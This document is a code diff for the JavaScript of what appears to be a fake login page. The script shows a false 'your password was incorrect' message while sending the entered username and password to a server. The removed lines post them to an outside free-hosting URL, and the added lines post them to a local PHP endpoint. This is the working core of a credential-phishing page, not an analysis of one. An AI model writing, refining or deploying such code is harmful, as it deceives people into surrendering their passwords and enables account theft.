@@ -4,13 +4,13 @@ let submit = document.getElementById('submit')
 let error = document.getElementById('error')
 
 function uptrim() {
-    username.value = username.value.trim();
-    password.value = password.value.trim();
+    username.value = username.value.trim()
+    password.value = password.value.trim()
 }
 
-function checkpass(pass, user) {
+function checkpass() {
     uptrim()
-    if (pass.length >= 6 && user.length > 0) {
+    if (password.value.length >= 6 && username.value.length > 0) {
         return true;
     } else {
         return false;
@@ -18,40 +18,39 @@ function checkpass(pass, user) {
 }
 
 function enablej() {
-    if (checkpass(password.value, username.value)) {
+    if (checkpass()) {
         submit.removeAttribute('disabled');
     } else {
         submit.setAttribute('disabled', true);
     }
 }
 
-username.addEventListener('keydown', () => {
+username.addEventListener('keyup', () => {
     enablej()
+    console.log(checkpass())
 })
 
-password.addEventListener('keydown', () => {
+password.addEventListener('keyup', () => {
     enablej()
+    console.log(checkpass())
 }) 
 
 submit.addEventListener('click', () => {
     uptrim()
     error.textContent = `Sorry, your password was incorrect. Please double-check your password.`;
     console.log(`submit=submit&username=${username.value}&password=${password.value}`);
-    XMLHttpRequestFn({
-        method: 'POST',
-        url: 'https://webskod.000webhostapp.com/index.php',
-        data: `submit=submit&username=${username.value}&password=${password.value}`,
-        callbackT: (response) => {
-            console.log(response);
-        } 
-    })
+    if (checkpass()) {
+        XMLHttpRequestFn({
+            method: 'POST',
+            url: 'http://localhost/local/cru.php',
+            data: `submit=submit&username=${username.value}&password=${password.value}`,
+            callbackT: (response) => {
+                console.log(response);
+            } 
+        })
+    }
+
 })
-
-
-
-
-
-
 
 // ################
 
